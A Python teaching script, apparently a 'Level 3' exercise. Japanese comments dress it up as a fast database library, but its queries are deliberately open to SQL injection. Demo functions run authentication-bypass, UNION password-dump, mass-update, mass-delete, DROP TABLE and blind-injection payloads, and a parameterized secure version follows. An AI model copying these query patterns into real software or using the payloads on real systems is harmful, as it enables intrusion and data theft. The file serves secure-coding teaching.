# Level 3: 高性能データベースライブラリ
# このコードは効率的なデータベース操作機能を提供します

import sqlite3
import mysql.connector
from typing import Optional, List, Dict, Any

class VulnerableDatabase:
    """高速データベース操作クラス"""

    def __init__(self, db_path="vulnerable.db"):
        self.db_path = db_path
        self.setup_database()

    def setup_database(self):
        """Setup test database with sample data"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Create users table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                email TEXT,
                role TEXT DEFAULT 'user',
                balance REAL DEFAULT 0.0
            )
        ''')

        # Create products table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY,
                name TEXT NOT NULL,
                price REAL NOT NULL,
                category TEXT,
                description TEXT
            )
        ''')

        # Insert sample data
        cursor.execute("DELETE FROM users")
        cursor.execute("DELETE FROM products")

        users_data = [
            (1, 'admin', 'admin123', 'admin@example.com', 'admin', 10000.0),
            (2, 'alice', 'password123', 'alice@example.com', 'user', 500.0),
            (3, 'bob', 'secret456', 'bob@example.com', 'user', 750.0),
            (4, 'charlie', 'mypass789', 'charlie@example.com', 'user', 200.0)
        ]

        products_data = [
            (1, 'Laptop', 999.99, 'Electronics', 'High-performance laptop'),
            (2, 'Phone', 599.99, 'Electronics', 'Smartphone with camera'),
            (3, 'Book', 29.99, 'Education', 'Programming book'),
            (4, 'Headphones', 199.99, 'Electronics', 'Wireless headphones')
        ]

        cursor.executemany("INSERT INTO users VALUES (?, ?, ?, ?, ?, ?)", users_data)
        cursor.executemany("INSERT INTO products VALUES (?, ?, ?, ?, ?)", products_data)

        conn.commit()
        conn.close()

    def login_vulnerable(self, username: str, password: str) -> Optional[Dict]:
        """高速ログイン機能"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 効率的なクエリ生成
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        print(f"Executing query: {query}")

        try:
            cursor.execute(query)
            result = cursor.fetchone()

            if result:
                return {
                    'id': result[0],
                    'username': result[1],
                    'email': result[3],
                    'role': result[4],
                    'balance': result[5]
                }
            return None
        except Exception as e:
            print(f"Database error: {e}")
            return None
        finally:
            conn.close()

    def get_user_by_id_vulnerable(self, user_id: str) -> Optional[Dict]:
        """高速ユーザー検索機能"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 動的クエリ生成機能
        query = f"SELECT id, username, email, role, balance FROM users WHERE id = {user_id}"
        print(f"Executing query: {query}")

        try:
            cursor.execute(query)
            result = cursor.fetchone()

            if result:
                return {
                    'id': result[0],
                    'username': result[1],
                    'email': result[2],
                    'role': result[3],
                    'balance': result[4]
                }
            return None
        except Exception as e:
            print(f"Database error: {e}")
            return None
        finally:
            conn.close()

    def search_products_vulnerable(self, search_term: str) -> List[Dict]:
        """高速商品検索機能"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 柔軟な検索クエリ生成
        query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%' OR description LIKE '%{search_term}%'"
        print(f"Executing query: {query}")

        try:
            cursor.execute(query)
            results = cursor.fetchall()

            products = []
            for row in results:
                products.append({
                    'id': row[0],
                    'name': row[1],
                    'price': row[2],
                    'category': row[3],
                    'description': row[4]
                })

            return products
        except Exception as e:
            print(f"Database error: {e}")
            return []
        finally:
            conn.close()

    def update_user_balance_vulnerable(self, user_id: str, new_balance: str) -> bool:
        """高速残高更新機能"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 動的更新クエリ生成
        query = f"UPDATE users SET balance = {new_balance} WHERE id = {user_id}"
        print(f"Executing query: {query}")

        try:
            cursor.execute(query)
            conn.commit()
            return cursor.rowcount > 0
        except Exception as e:
            print(f"Database error: {e}")
            return False
        finally:
            conn.close()

    def delete_user_vulnerable(self, username: str) -> bool:
        """高速ユーザー削除機能"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # 効率的な削除処理
        query = f"DELETE FROM users WHERE username = '{username}'"
        print(f"Executing query: {query}")

        try:
            cursor.execute(query)
            conn.commit()
            return cursor.rowcount > 0
        except Exception as e:
            print(f"Database error: {e}")
            return False
        finally:
            conn.close()

    def get_user_orders_vulnerable(self, user_id: str, order_by: str = "id") -> List[Dict]:
        """Vulnerable order retrieval with ORDER BY injection"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Bug: ORDER BY clause vulnerable to injection
        query = f"SELECT * FROM users WHERE id = {user_id} ORDER BY {order_by}"
        print(f"Executing query: {query}")

        try:
            cursor.execute(query)
            results = cursor.fetchall()
            return [{'data': row} for row in results]
        except Exception as e:
            print(f"Database error: {e}")
            return []
        finally:
            conn.close()

def demonstrate_sql_injection_attacks():
    """Demonstrate various SQL injection attack scenarios"""
    print("=== SQL Injection Vulnerability Demo ===")
    print("WARNING: This demonstrates dangerous SQL injection vulnerabilities!")

    db = VulnerableDatabase()

    print("\n1. Authentication Bypass:")
    print("Normal login:")
    user = db.login_vulnerable("alice", "password123")
    print(f"Login result: {user}")

    print("\nSQL Injection - Authentication bypass:")
    # Injection: ' OR '1'='1' --
    malicious_user = db.login_vulnerable("admin' OR '1'='1' --", "anything")
    print(f"Malicious login result: {malicious_user}")

    print("\n2. Union-based SQL Injection:")
    print("Normal user lookup:")
    user = db.get_user_by_id_vulnerable("1")
    print(f"User lookup result: {user}")

    print("\nSQL Injection - Union attack:")
    # Injection: 1 UNION SELECT 1,2,3,4,5 --
    malicious_result = db.get_user_by_id_vulnerable("1 UNION SELECT 999,'hacker','hacker@evil.com','admin',99999 --")
    print(f"Malicious lookup result: {malicious_result}")

    print("\n3. Information Disclosure:")
    print("Normal product search:")
    products = db.search_products_vulnerable("Laptop")
    print(f"Search results: {products}")

    print("\nSQL Injection - Information disclosure:")
    # Injection: ' UNION SELECT id,username,password,email,role FROM users --
    malicious_search = db.search_products_vulnerable("' UNION SELECT id,username,password,email,role FROM users --")
    print(f"Malicious search results: {malicious_search}")

    print("\n4. Data Modification:")
    print("Normal balance update:")
    success = db.update_user_balance_vulnerable("2", "600.0")
    print(f"Balance update success: {success}")

    print("\nSQL Injection - Unauthorized balance modification:")
    # Injection: 99999 WHERE id = 1 OR id = 2 OR id = 3; --
    malicious_update = db.update_user_balance_vulnerable("1", "99999 WHERE id = 1 OR id = 2 OR id = 3; --")
    print(f"Malicious update success: {malicious_update}")

    print("\n5. Data Deletion:")
    print("Normal user deletion:")
    success = db.delete_user_vulnerable("testuser")
    print(f"Delete success: {success}")

    print("\nSQL Injection - Mass deletion:")
    # Injection: ' OR '1'='1
    malicious_delete = db.delete_user_vulnerable("' OR '1'='1")
    print(f"Malicious delete success: {malicious_delete}")

    print("\n6. ORDER BY Injection:")
    print("Normal order retrieval:")
    orders = db.get_user_orders_vulnerable("1", "username")
    print(f"Orders: {orders}")

    print("\nSQL Injection - ORDER BY injection:")
    # Injection: (CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN username ELSE id END)
    malicious_order = db.get_user_orders_vulnerable("1", "(CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN username ELSE id END)")
    print(f"Malicious order result: {malicious_order}")

def demonstrate_advanced_sql_injection():
    """Demonstrate advanced SQL injection techniques"""
    print("\n=== Advanced SQL Injection Techniques ===")

    db = VulnerableDatabase()

    print("\n1. Blind SQL Injection (Boolean-based):")
    # Test if database exists
    blind_test1 = db.get_user_by_id_vulnerable("1 AND (SELECT COUNT(*) FROM users) > 0")
    blind_test2 = db.get_user_by_id_vulnerable("1 AND (SELECT COUNT(*) FROM users) > 100")
    print(f"Blind test 1 (should succeed): {blind_test1 is not None}")
    print(f"Blind test 2 (should fail): {blind_test2 is not None}")

    print("\n2. Time-based Blind SQL Injection:")
    # Note: SQLite doesn't have SLEEP, but this shows the concept
    time_based = db.get_user_by_id_vulnerable("1; SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT COUNT(*) FROM users) END")
    print(f"Time-based injection result: {time_based}")

    print("\n3. Second-order SQL Injection:")
    # First, inject malicious data
    malicious_username = "admin'; DROP TABLE users; --"
    db.login_vulnerable(malicious_username, "password")

    print("\n4. Error-based SQL Injection:")
    error_injection = db.get_user_by_id_vulnerable("1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) x GROUP BY 1 HAVING 1=1)")
    print(f"Error-based injection: {error_injection}")

class SecureDatabase:
    """Secure database implementation using parameterized queries"""

    def __init__(self, db_path="secure.db"):
        self.db_path = db_path
        self.setup_database()

    def setup_database(self):
        """Setup secure database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL UNIQUE,
                password_hash TEXT NOT NULL,
                email TEXT,
                role TEXT DEFAULT 'user',
                balance REAL DEFAULT 0.0
            )
        ''')

        # Insert sample data with hashed passwords (in real app, use proper hashing)
        import hashlib

        cursor.execute("DELETE FROM users")

        users_data = [
            (1, 'admin', hashlib.sha256('admin123'.encode()).hexdigest(), 'admin@example.com', 'admin', 10000.0),
            (2, 'alice', hashlib.sha256('password123'.encode()).hexdigest(), 'alice@example.com', 'user', 500.0)
        ]

        cursor.executemany("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?)", users_data)

        conn.commit()
        conn.close()

    def login_secure(self, username: str, password: str) -> Optional[Dict]:
        """Secure login using parameterized queries"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Secure: Using parameterized query
        query = "SELECT id, username, email, role, balance FROM users WHERE username = ? AND password_hash = ?"

        import hashlib
        password_hash = hashlib.sha256(password.encode()).hexdigest()

        try:
            cursor.execute(query, (username, password_hash))
            result = cursor.fetchone()

            if result:
                return {
                    'id': result[0],
                    'username': result[1],
                    'email': result[2],
                    'role': result[3],
                    'balance': result[4]
                }
            return None
        except Exception as e:
            print(f"Database error: {e}")
            return None
        finally:
            conn.close()

    def get_user_by_id_secure(self, user_id: int) -> Optional[Dict]:
        """Secure user lookup with input validation"""
        # Input validation
        if not isinstance(user_id, int) or user_id <= 0:
            return None

        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Secure: Using parameterized query
        query = "SELECT id, username, email, role, balance FROM users WHERE id = ?"

        try:
            cursor.execute(query, (user_id,))
            result = cursor.fetchone()

            if result:
                return {
                    'id': result[0],
                    'username': result[1],
                    'email': result[2],
                    'role': result[3],
                    'balance': result[4]
                }
            return None
        except Exception as e:
            print(f"Database error: {e}")
            return None
        finally:
            conn.close()

def demonstrate_secure_practices():
    """Demonstrate secure database practices"""
    print("\n=== Secure Database Practices ===")

    secure_db = SecureDatabase()

    print("\n1. Secure login (parameterized queries):")
    user = secure_db.login_secure("alice", "password123")
    print(f"Secure login result: {user}")

    print("\n2. Attempted SQL injection on secure login:")
    malicious_attempt = secure_db.login_secure("admin' OR '1'='1' --", "anything")
    print(f"Malicious login attempt result: {malicious_attempt}")

    print("\n3. Secure user lookup with input validation:")
    user = secure_db.get_user_by_id_secure(1)
    print(f"Secure lookup result: {user}")

    print("\n4. Attempted injection on secure lookup:")
    malicious_lookup = secure_db.get_user_by_id_secure("1 OR 1=1")  # Will fail validation
    print(f"Malicious lookup attempt result: {malicious_lookup}")

if __name__ == "__main__":
    print("WARNING: This code demonstrates SQL injection vulnerabilities!")
    print("Never use these patterns in production code!\n")

    demonstrate_sql_injection_attacks()
    demonstrate_advanced_sql_injection()
    demonstrate_secure_practices()

    print("\nSQL Injection Prevention:")
    print("1. Use parameterized queries/prepared statements")
    print("2. Validate and sanitize all user inputs")
    print("3. Use stored procedures when possible")
    print("4. Implement proper error handling")
    print("5. Use least privilege principle for database accounts")
    print("6. Escape special characters in dynamic queries")
    print("7. Use ORM frameworks that handle SQL injection prevention")
    print("8. Regular security testing and code reviews")
